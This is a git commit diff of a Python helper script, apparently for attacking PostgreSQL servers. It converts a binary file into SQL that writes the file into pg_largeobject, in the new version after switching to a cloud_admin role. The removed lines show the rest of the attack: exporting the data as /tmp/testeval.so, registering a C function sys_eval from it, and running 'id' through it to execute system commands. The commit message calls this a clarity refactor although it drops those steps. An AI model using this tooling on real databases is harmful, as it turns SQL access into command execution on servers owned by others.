2f8df824addda88d2a6dcaa21ba2615be8f276be
testtianmaaaa <108706107+testtianmaaaa@users.noreply.github.com>
2026-07-08 15:49:01 +0800

    Refactor postgresql_udf_help.py for clarity and structure

--- postgresql_udf_help.py
+++ postgresql_udf_help.py
@@ -1,33 +1,41 @@
-#~/usr/bin/env python3
-#-*- coding:utf-8 -*-
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
 import sys
 from random import randint
+
 number = randint(1000, 9999)
+CHUNK_SIZE = 2048
+
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: python {sys.argv[0]} inputfile")
+        sys.exit(1)
+
+    input_file = sys.argv[1]
+    print(f"set role cloud_admin;")
+    print(f"SELECT lo_create({number});")
+
+    block = 0
+
+    with open(input_file, "rb") as fileobj:
+        while True:
+            data = fileobj.read(CHUNK_SIZE)
+            if not data:
+                break
+
+            payload = data.hex()
+
+            print(
+                "insert into pg_largeobject values "
+                f"({number}, {block}, decode('{payload}', 'hex'));\n"
+            )
+
+            block += 1
+
 
 if __name__ == "__main__":
-    if len(sys.argv) != 2:
-        print("Usage:python " + sys.argv[0] + "inputfile")
-        sys.exit()
-    fileobj = open(sys.argv[1],'rb')
-    i = 0
-    t = -1
-    s = ''
-    print('SELECT lo_create({number});'.format(number=number))
-    for b in fileobj.read():
-        i = i + 1
-        s += b
-        if i % 4096 == 0:
-            t = t + 1
-            print('insert into pg_largeobject values ({number}, {block}, decode(\'{payload}\',\'hex\'));\n'\
-                    .format(number=number, block=t, payload=s))
-            s = ''
-    t=t+1
-    print('insert into pg_largeobject values ({number}, {block}, decode(\'{payload}\',\'hex\'));\n'.format(number=number, block=t, payload=s))
+    main()
 
-    print('SELECT lo_export({number}, \'/tmp/testeval.so\');'.format(number=number))
-
-    print('CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS \'/tmp/testeval.so\', \'sys_eval\' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;')
-
-    print('select sys_eval(\'id\');')
-
-    fileobj.close()
+    
